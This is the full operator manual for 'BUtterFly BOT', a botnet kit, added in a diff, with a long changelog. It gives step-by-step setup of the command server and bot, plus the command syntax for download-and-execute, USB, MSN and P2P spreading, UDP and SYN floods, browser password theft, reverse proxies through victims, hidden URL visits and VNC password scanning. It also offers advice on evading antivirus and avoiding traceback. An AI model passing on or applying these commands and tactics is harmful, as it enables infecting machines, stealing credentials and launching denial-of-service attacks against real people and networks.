@@ -1,0 +1,560 @@
+******************************************************
+	   BUtterFly BOT v1.51 PROFESSIONAL
+		new generation bot
+******************************************************
+Developed by iserdo
+Copyright (c) 2008, 2009
+contact: iserdo@gmail.com
+Website: http://bfsecurity.net
+------------------------------------------------------
+FOR TESTING PURPOSES ONLY! AUTHOR OF THIS SOFTWARE 
+IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED
+BY THIS SOFTWARE! USE AT YOUR OWN RISK!
+------------------------------------------------------
+
+TABLE OF CONTENTS:
+I. CONTENTS OF BFBOT PACKAGE
+II. PREPARATIONS
+a) server
+b) master client
+c) bot
+III. USING MASTER CLIENT APPLICATION
+IV. DISPATCHER
+V. USING REVERSE SOCKS APPLICATION
+VI. PROTOCOL EXPLAINED
+VII. DOWNLOADER EXPLAINED
+VIII. FIXES
+
+
+I. CONTENTS OF BFBOT PACKAGE
+
+This package contains following applications
+- bfbot server for windows and linux binary (folder server)
+- master-client application and master-dll dll 
+  (folder master-tools\master)
+- bot binary (folder bot)
+- bot binary editor (folder master-tools\bin-editor)
+- reverse socks receiver (folder master-tools\reverse-socks)
+- MD5 tool for making MD5 hashes (folder master-tools\other)
+
+
+II. PREPARATIONS
+
+WARNING: YOU HAVE TO CONFIGURE BOT BEFORE YOU LAUNCH IT!
+
+Before installing and launching bot on victims, you
+should prepare server and master client to work for
+you. Read following to learn how to do it.
+
+a) server
+
+Server files are located in folder server. server.cfg
+is the file you should modify first. Most important
+are port, mastermd5 and visitormd5 values. For port,
+enter in any value you want between 1 and 65535
+(usually the one bot will use of course). Also don't
+forget to change mastermd5 and visitormd5. Use MD5.exe
+tool in tools folder to generate md5 hash for certain
+string; eg. if you would like to use string "iammasta"
+for logging into your server, then put in config file
+"216e19eec6e311caba33585b950e3bea" as this is the md5
+hash of string "iammasta". Do the same for visitormd5.
+After you are done, save server.cfg and you are ready
+to go with launching the server. If you use windows
+for hosting server, then simply run "server_w.exe".
+If you use *nix then first chmod server_l to executable,
+then run it. Attention: server.cfg must be in same folder
+as servers executable!
+
+You can gline IP(s) from server. Just put IP(s) into
+glines.txt file, each one in new line. You can gline
+whole ranges. 
+Example how to gline 192.168.*.*: 192.168.
+Example how to gline 12.*.*.*: 12.
+Example how to gline 202.144.55.*: 202.144.55.
+
+
+b) master client
+
+You need .NET framework to run it!
+Read III. USING MASTER CLIENT APPLICATION section.
+
+
+c) bot
+
+Launch bot binary editor (bot_editor.exe) and open bot.exe
+with it. Modify all values as you wish. If you are unsure about
+value DO NOT CHANGE IT! When changing USB spreader settings,
+you have to take into account following:
+- filename must end with .exe
+- folder can not be empty
+- no subfolders are possible
+- when writting autorun.inf, you have to have same filename and
+  folder, else USB spreader will not work!
+- max filename size is 31 characters
+- max folder size is 31 characters
+- max autorun.inf size is 1023 characters
+- PC delay (presence check delay) must be the same as setting
+  of "pcdelay" inside server.cfg and it tells how often PCD
+  packets are sent;
+    lower value - more accurate presence detecting of bot but
+	  	  higher resources usage on server side
+    higher value - less accurate presence detecting of bot but
+		   lesser resources usage on server side 
+
+NOTE ABOUT AUTORUN.INF FILE: Speed of USB spreading greatly
+depends on autorun.inf file so you SHOULD change it and make it
+fully undetected if you wish to get good results from USB
+spreading.
+
+If you are planning to use packer/crypter on bot, then you have
+to uncheck "Make poly copies" - else usb and p2p spreaders will
+not work. After you are done with modifications, click Save
+button and Exit.
+
+You can manually make poly version of bot by passing it parameters:
+1 [newbotfilename]
+
+Example: >bot.exe 1 new_bot.exe
+
+This will generate polymorphic copy of bot.
+
+It is recommended that you test bot on your pc (virtualbox) first
+to see if everything works ok. Author is not responsible if you 
+load many bots and loose them only because you have not tested it on
+your own first and reported error back to the author.
+
+
+II. USING MASTER CLIENT APPLICATION
+
+a) GUI mode
+
+Run master_client.exe. master-dll.dll must be in same folder as
+master_client.exe at all times! If it is not, application will
+crash. settings.ini file will appear in same folder, which keeps
+settings of the application for future use. To reset application
+to default settings, just delete settings.ini file.
+
+Once you are connected to server, you can issue commands in editbox
+at the bottom. You can erase log content by command: cls
+To mute/unmute displaying text in log use command: mute
+
+b) command line mode
+
+Most important for successful commanding is knowing difference
+between PROTOCOL and BOT COMMANDS. Read them below here.
+
+Remember that each command you pass in master client (bottom editbox)
+has to be composed of PROTOCOL (+ BOT command).
+
+--------------
+-BOT COMMANDS-
+--------------
+
+Download Code: riseup
+Update Code: evolution
+Uninstall Code: rinsenow
+
+v - version
+download [url] - download file from url to temp folder and
+                 execute it
+update [url] - download file from url, execute it and remove bot
+remove - remove bot
+m1 [url] - start msn spreader; you can put '*' in url, those
+           will be replaced with random letters for each bot
+m0 - stop msn spreader
+pn [filename] - p2p spread into sharing folders with filename
+pd [url]@[filename] - p2p spread into sharing folders with
+		      filename from certain url
+u1 - start usb spreader
+u0 - stop usb spreader
+s1 [channel] - silent certain channel
+s0 [channel] - unsilent certain channel
+
+BFBOT with DDOS support:
+fu1 [ip] [port] [packets] - UDP flood IP:PORT with number of packets
+                            (0 packets for infinite ddos)
+fu0 - stop UDP flood
+ft1 [ip] [port] [packets] - TCP flood IP:PORT with number of SYN
+                            packets (0 packets for infinite ddos)
+ft0 - stop TCP flood
+
+Example to ddos 192.168.0.1 with 1000 udp packets:
+ac fu1 192.168.0.1 100 1000
+
+BFBOT with FIREFOX password harvesting:
+lf - obtain firefox passwords (if firefox installed and if there are 
+     any saved passwords)
+
+BFBOT with IE6,7 password harvesting:
+l6 - obtain Internet Explorer 5, 6 passwords
+l7 - obtain Internet Explorer 7 passwords
+
+BFBOT with socks support:
+rs1 [ip] [port] - start reverse socks and reverse connect to
+                  given ip and port
+rs0 - stop reverse socks
+
+BFBOT with VISIT:
+vv [url] - visible visit (work as adware)
+vm [url] - visit with SW_HIDE mode
+vh [url] (referrer) - visit certain url (hidden) with optional
+		      referrer (if specified)
+
+BFBOT with PORTSCANNER (VNC scanning):
+o1 v[params] 5900 (ip) (passwords) - start portscanner
+o0				   - stop portscanner
+
+params are:
+A - A class IP scan
+B - B class IP scan (default)
+C - C class IP scan
+r - random IP scan
+s - sequential IP scan (default)
+i - use internal IP (IP param is ignored)
+e - use external IP (IP param is ignored)
+
+Examples:
+o1 vrBi 5900 pass admin 123 - this will start scanning internal IPs 
+		   (random B class) with passwords: pass, admin, 123
+o1 vsCe 5900 admin pass123 - this will start scanning external IPs
+		   (sequential C class) with passwords: admin, pass123
+o1 vsB 5900 192.168.1.30 admin 123 - start scanning from ip 192.168.1.30
+		   (sequential B class) with passwords: admin, 123
+
+-------------------
+-PROTOCOL COMMANDS-
+-------------------
+
+Supported protocol commands are following:
+
+ac Command all
+ar Reconnect all
+ak Kill all
+am Mute all
+
+uc Command user
+ur Reconnect user
+uk Kill user
+um Mute user
+
+nc Command <n> users
+nr Reconnect <n> users
+nk Kill <n> users
+
+cc Country command
+
+jl List onjoin commands
+ja Add onjoin command
+jr Remove onjoin cmd
+
+sr Server restart
+sq Server quit
+sg Server svar get
+ss Server svar set
+
+To get certain svar, use sg. Example: sg maxupload
+To set certain svar, use ss. Example: ss maxupload 100000
+
+When you give orders to single bot, you need to pass it in 
+following form: [order] [botip][botport] [params]
+
+Example if you want to reconnect bot with ip 127.0.0.1 and port
+1234, you would type in: ur 127.0.0.1:1234
+If you would like to start usb spreader on certain bot:
+uc 127.0.0.1:1234 u1
+
+When you give order to all bots, you use a[x] command, where x
+stands for all possible orders. Example, when you want to kill
+all bots: ak
+Or when you want to start msn spreader on all bots:
+ac m1 http://****.myhostspace.com
+
+You can give command to <n> amount of bots (useful for updating 
+large amount of bots) so you do not flood HTTP or FTP server.
+For example to update 100 bots:
+nc 100 [yourupdatecode] http://myurl.com/bot.exe
+
+If you wish to command only bots from certain country, you can
+use cc. Example to give version command only to USA bots:
+cc USA v
+Remember that country code is always 3 letters and is case sensitive!
+
+It is possible to add on join commands - command that are
+received when bot joins the server (kinda like topic @ irc).
+You can add command with ja, you can list current commands
+with jl and you can remove certain command with jr. When you
+use jr, the parameter is the number of command you want to
+remove. To get numbers of commands use jl.
+If you would like to onjoin command specific country, then append
+3 letters country code in front of command splitted by '@'. Example:
+ja USA@v
+(only bots from USA will respond with version reply to this)
+
+How to use jobs?
+To add command under x onjoin command: ja |x|command goes here
+Example: ja |1|fu1 192.168.0.1 80 100
+To query all commands under x onjoin command: jl |x|
+Example: jl |1|
+To remove certain command under x onjoin command with y id: jr |x|y
+Example: jl |1|1
+You can also use countries in jobs.
+
+IV. DISPATCHER
+
+Note: For small networks, you do not need to use dispatcher. It is only
+used for bigger networks, where you need to setup more servers to hold
+all clients properly.
+
+To enable server running as dispatcher, you need to set dispatcher to
+1 in config file of server. Configure all of your servers to use same
+mastermd5 hash! When you connect to dispatcher, it will try to connect
+to other servers specified in server config file. Commands that work
+for dispatcher are following:
+
+ac Command all
+ar Reconnect all
+ak Kill all
+am Mute all
+
+uc Command user
+ur Reconnect user
+uk Kill user
+um Mute user
+
+nc Command <n> users
+nr Reconnect <n> users
+nk Kill <n> users
+
+cc Country command
+
+jl List onjoin commands
+ja Add onjoin command
+jr Remove onjoin cmd
+
+sg Server svar get
+ss Server svar set
+
+Note: with nx commands, number of users is divided by number
+of servers dispatcher is being connected to. Divided number is dispatched
+to all servers (equal <n> number).
+
+
+V. USING REVERSE SOCKS APPLICATION
+
+Start reverse socks receiver application (socks-gui.exe). Click on
+Start button and enter in port for bots to connect to and local port
+which to use for all socks application to connect to. Also adjust
+max clients if you wish to use more/less bots (warning: high value
+might slow down your PC). Then you order bots to connect to your IP.
+Preferably, issue reverse socks command only on certain number of bots.
+Too many bots with active reverse socks might flood your PC.
+
+After some clients are connected, you can select which one(s) to use.
+If you do not want to use certain clients, then it is the best to
+kick them.
+
+
+VI. PROTOCOL EXPLAINED
+
+Communication protocol runs on UDP packets, so the major benefit
+is stealthness of it. TCP connections are usually logged at
+various firewalls, gateways etc, even providers log them! If you
+use IRC protocol for bots, it's easy to backtrack and locate
+you, since IRC uses TCP.
+
+But since UDP is connection-less, there are some differences if
+you are going to compare join/quit events in this protocol and
+in IRC protocol. When bot is killed (usually by system turn off),
+socket on bot's side is closed and TCP data sent across network
+to the server, that connection has been closed. IRC server can
+therefore notify you with: Connection reset by peer. But UDP
+doesn't work like that. When socket is closed, there is no data
+transfered to the server. So my protocol uses so called
+"presence-check", which is by default 2 minutes. Each bot is
+checked every 2 minutes if it is responsible or not. If a certain
+bot is non-responsible when check packet is sent, server will
+report it as timedout. Additionally to that, each packet sent 
+from server that does not get confirmation from bot will cause
+server to drop that bot and report timedout. Following these, you
+will observe following happenings (WHICH ARE NORMAL!):
+- bots will normaly never quit, only timeout
+- bots quit only when you give an order (if you see bots quit
+  without passing them any such order, then someone else is
+  doing it)
+- some bots with bad connection would constantly join/timeout;
+  that is normal and the severity depends on packet loss between
+  these bots and server
+- when you pass command to all bots, it can happen that after
+  some seconds (num retransmissions * retransmission delay)
+  some bots timeout (like 20 when you have 1k bots); these bots
+  were dead even before you passed the command, but the server
+  did not know that until you passed the command; if you would
+  not have passed it, these would timeout in 2 min time anyway
+- if the server suddenly falls into huge udp packet loss, you
+  will see massive timeouts (and massive joinings)
+- if you set command s in onjoin and other commands next, it
+  can happen that some bots talk anyway; this is caused:
+  "If two messages are sent to the same recipient, the order 
+  in which they arrive cannot be predicted."
+
+
+VII. DOWNLOADER EXPLAINED
+
+If you get feeling like downloader isn't working properly, consider
+following possible issues:
+- webhosting not avaliable to certain bots (bots reply with FAILED)
+- bots downloaded files are cached - if you give bots same url to dl 
+  next time with different file on webhosting, bots just take file 
+  from cache (old file)
+- your stuff is not FUD
+- your stuff doesn't work under limited privileges (any malware that 
+  uses rootkits, runs as service, tries to put into sys32 dir etc,...)
+
+
+VIII. FIXES
+(version 1.51)
+- windows 7 compatibility
+- fixed reverse socks bugs
+- added vm visit command
+- fixed msn plus crash bug
+(version 1.50)
+- fixed TCP flood bug
+- fixed vista ExitThread crash bug
+- fixed windows2000 crash bug
+- enlarged buffer for autorun.inf file
+- fixed windows2003 crash bug
+(version 1.48)
+- fixed master client crash bug on 64bit OSes
+- fixed master client showing wrong command in onjoin list when '@' 
+  used
+- fixed server displaying wrong number of users over period of time
+- added 1.30 ext killer
+- fixed socks upload bug
+(version 1.46)
+- fixed bug in country command
+- fixed bug in some onjoin/job commands showing "too big" instead of 
+  real content
+- fixed client crash bug happening if port scanner active when issuing 
+  uninstall command
+- added EVENT + color for Newly infected via USB in master client
+- addon that permits only certain IP(s) to log in as master on server
+- no more socks timeout when receiving large files
+- fixed bug in server that could lead to crash when querying list of 
+  clients
+(version 1.44)
+- better dispatcher (local storage of client list, support for 
+  onjoin/job commands)
+- added A IP class range scanning in bot
+- added detection of infection via USB drive
+- added detection of admin/limited account
+- added hostname reporting
+- added support of onjoin job commands in master client
+- different port scanning parameters (read manual.txt before using!) 
+- added support for passwords (from file) truncating into job commands 
+  for vnc pass scanning in master client 
+(version 1.43)
+- added maxupload limit on master client side
+- fixed bug in dispatcher redirecting 
+(version 1.42)
+- fixed msn reporting bug (text not null terminated)
+- improved maxupload and maxuploadperclient handling
+- added QUERY_LIST_ADV_PROGRESS - monitoring progress of client list 
+  loading
+- option to change presence check delay and if all clients are sending 
+  keep-alive packets
+- added new svar: presence check delay
+- possibility for sending large lists of onjoin and job commands
+- added SERVER_OJ_LIST_PROGRESS - monitoring progress of onjoin list 
+  loading
+- fixed CPU usage and connection dropping on master client
+- added limit to master client log
+(version 1.41)
+- fixed p2p download spreader not working
+- query client list permitted for visitors
+- fixed linux server bin making corrupted hashes (inability to join as 
+  master/visitor)
+- all clients send keep-alive packets
+(version 1.40)
+- max client upload (no client flooding)
+- fixed max server upload (bug in calculation)
+- added onjoin country commands
+- socks receiver GUI application
+- improved reverse socks
+- one internet handle for all downloads
+- added missing dialog destroying in client after connection lost
+- reverse socks are now persistent
+- p2p poly key calculated out of file name (not hardcoded anymore)
+- added option to download file from web into p2p sharing folders
+- using pipes for inter-thread communication in downloader (100% 
+  thread safety)
+- visit (hidden or visible)
+- msn spreader hooking incoming dialogs
+- different startup methods (for limited and admin accounts)
+- fixed null bug: after termination of flooding could cause bot 
+  termination
+- fixed select bug when detecting connect status on non-blocking
+  socket
+- added vnc password scanning (+ noauth, authbypass)
+- added BFBOT editor so some variables can be changed without new 
+  compilation
+- optimized server speed with some tweaks
+- added missing connect ack reply in master client, where server
+  had to double send connect response
+- master client GUI application
+- dispatcher
+(version 1.30)
+- added extended features
+- new poly engine with new concept and different encoding
+(version 1.29)
+- distributed packet sending that reduces server flood when giving commands
+- added domain resolution to flood
+- win xp sp1 and lower now use more sockets for flood (stronger flood)
+- added option to limit max number of users on server
+- certain config variables are now svars and you are able to change them 
+  when server is running (sleeptime, maxupload, maxclients, ojdelay)
+- optimized joining system - less CPU usage on server side with many bots
+(version 1.28)
+- added jobs (distributed onjoin commands)
+- added option to command bots by country (cc)
+- fixed newly infected now reporting only for first time connected
+- fixed bug in master-dll.dll making all bots running on vista showing as 
+  being unknown OS
+- added newly infected monitoring
+(version 1.27)
+- fixed bug in nc with sending command to all users
+- fixed bug showing wrong (negative) count of total clients and users
+(version 1.26)
+- p2p spreading - now all files with same MD5 (for better spreading)
+(version 1.25)
+- altered joining method; bots join after sys info is parsed
+- reporting some client info when client joins (permission, os, sp,..)
+- bot injecting whole .text sections instead of function by function
+  (reduced bot size for 2kb)
+(version 1.24)
+- presence check delay is not static; previous method was - pc packet
+  sent after 360 or 240 sec from last bot's response - this caused
+  all bots to have same time pc-ing and could result in server flood
+(version 1.23)
+- added server peak time (how long ago it happened)
+- added server messages reporting when peak is breached
+- added uptime in bot info query (correct calculation now)
+- added server messages reporting newly infected pcs
+  (so you can determine how fast your net is spreading)
+- added 4th parameter in message receive callback for master app
+  (contains pointer to raw data received by server)
+- presence check delay reduced from 360 to 240
+(version 1.21)
+- added onjoin support in server config file
+- bot prepared for upcoming support for linked servers
+- added option to kill/restart/command <n> amount of bots
+- fixed access violation bug in server when checking dialogs
+(version 1.20)
+- seq numbers 2 bytes big
+- seq related to dialogs
+- added incoming dialogs
+- presence check delay increased from 120 to 360
+- fixed bug with resent packets (were encoded 2 or more times)
+- added smart keepalive method; only bots behind NAT send keep alive packets
+- added si command; query server information (version, uptime, peak, etc) 
+- altered s command (can now mute/unmute certain channel)
